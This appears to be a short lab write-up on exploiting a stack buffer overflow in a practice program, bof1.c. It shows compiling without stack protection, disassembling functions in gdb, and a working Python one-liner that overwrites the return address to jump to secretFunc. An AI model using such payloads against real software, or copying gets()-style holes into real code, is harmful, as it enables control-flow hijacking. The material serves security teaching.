# Understand bof1.c 
In this attack, we will try to replace the return address with another function's return address (redirect control) by using python!
## stackframe

## Vulnerbility
At "gets(array)"; function, we see that hackers can exploit the stackframe by adding more bytes in python in order to redirect the return address! 
# Start attacking bof1.c 
## Compiling the file without stack restriction
`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`    
![image](https://github.com/user-attachments/assets/21d80169-9f8e-4b30-9a74-2a1f724fe91e)
## Run gdb for futher examination
`gdb bof1.out`      
![image](https://github.com/user-attachments/assets/fd0f1874-33e5-462a-b728-5585a58f25f2)
## Try to see each func in machine code!
With **vuln**: `disas vuln`    
![image](https://github.com/user-attachments/assets/5cebaf7c-ea46-4f84-8ca1-5cadb035417b)  
With **secretFunc**: `disas secretFunc`  
![image](https://github.com/user-attachments/assets/9309975e-fe08-4948-b08a-ff2b48181bd6)  
=> We see that the address of  **secretFunc** is `0x0804846b`. So now, we are going to replace the **vuln's return address** with the **secretFunc's return address**.
## Calculate the total bytes to attack
As can be seen from the stackframe, we need in sum of 204 bytes of a and the last will be the return address of **secretFunc**  
Now we use `q` to exit and type `echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 123` to see the result!  
![image](https://github.com/user-attachments/assets/e7537703-ab20-4977-96fb-a0ee086fc7ec)

